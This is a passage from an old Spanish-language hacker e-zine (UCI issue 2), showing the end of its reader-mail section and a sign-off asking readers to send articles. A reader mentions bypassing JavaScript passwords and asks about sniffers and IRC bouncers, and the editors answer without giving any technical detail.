hubiera imaginado este
forma tan ingeniosa de saltarte los pass; pero no solo te sirve para eso, 
Muchas veces en algunas
paginas no permiten ver el codigo fuente por que en el contenido de la 
pagina se encuentran videos,
sonidos, showaves o imagenes que te gustaria guardar y el p... codigo fuente 
esta deshabilitado y
esta forma me podria servir mucho para todo este tipo de casos.

[7].PGPFONE 2.1
-magmax-

Me encanto el tema de la cryptografía telefonica por medio del pgpfone. Creo 
ke la Kryptografía
es un buen tema y no se deveria excluir de ninguno de sus ejemplares.
-magmax- menciono que:
"tambien te pueden pichar la conexión de tu ISP con un sniffer"    
???????????
  No entiendo el tema de sniffer, quisiera saber si podrian hablar un poco 
sobre el tema
en su proximo numero.

Tambien me gusto un poco lo de los BouNCeRs del irc y quisiera saber si me 
podrian proporcionar de
uno para pobrarlo y ver que honda.

Les recomiendo (aunque ya esta un poco chotiado o fregado) que pongan hasta 
el ultimo los LInks de Algunas paginas que esten buenas, que
sean de ustedes o que nos recomienden.


                         "POR VAFOR RESPONDANME EL MAIL PERSONALMENTE"


Bueno hechenle ganas y no se detengan.

****@********@********@****

No nos riñas por no responderte personalmente pero es k las dudas hemos acordado solo responderlas en esta sección (comprendenos, hay ke inflar la revista como sea ;) )

Efectivamente, el artículo sobre el código fuente, passwords de javascript y demás sirve para muchas más cosas. Una vez uno comprende el código (html o el k sea) de la página puede ver muchas cosas k normalmente la página no muestra o no deja coger (abstenerse linkeadores warez de usar esta técnica ;) )

Sobre el tema del sniffer pues lo dejamos también pendiente para UCI3, ¿oka? Recuerdamelo en un mail ke luego se nos pasa y... xD

Y los links, pues estamos remodelando la web totalmente y esperamos poner una sección de links más o menos decente. Si keréis ke vuestra web o una de vuestras favoritas aparezca en nuestra sección ya sabéis, pasaos por #uci en el irc, maileadnos o nos paráis por la calle y nos lo decís (somos los tios con más ojeras que veáis ;) )

=================================================================
=================================================================
=================================================================

Y weno weno, esta sección se acaba pq no tengo time para más :(
Ya se nos ocurrirá algo para hacer esta sección muchíiisimo mayor en UCI3. Mientras tanto seguidnos escribiendo todas vuestras dudas/comentarios/sugerencias a

uci@paistortuga.com


Gracias por leernos!!!


--------------------------------------------------------------------
--------------------------------------------------------------------




[14].Colabora con nosotros. Despedida
    -S0b-


	Antes de despedirnos, dedicamos parte de esta sección a pediros ayuda, a pediros que colaboréis con artículos, con textos, con ideas, con teléfonos de tias buenas ;) con lo que queráis para UCI. Toda ayuda es poca y siempre bienvenida, asi que os rogamos no dudéis en escribirnos a uci@paistortuga.com y contarnos lo que sea.

	Y bueno, colorín colorado UCI 2 se ha acabado ( Por fin!! ;) )
	Espero (esperamos) que os haya resultado entretenido, ke hayais aprendido algo y que no os hayamos caido muy mal ;)
	
	Gracias por estar ahi

								s0b





--------------------------------------------------------------------
--------------------------------------------------------------------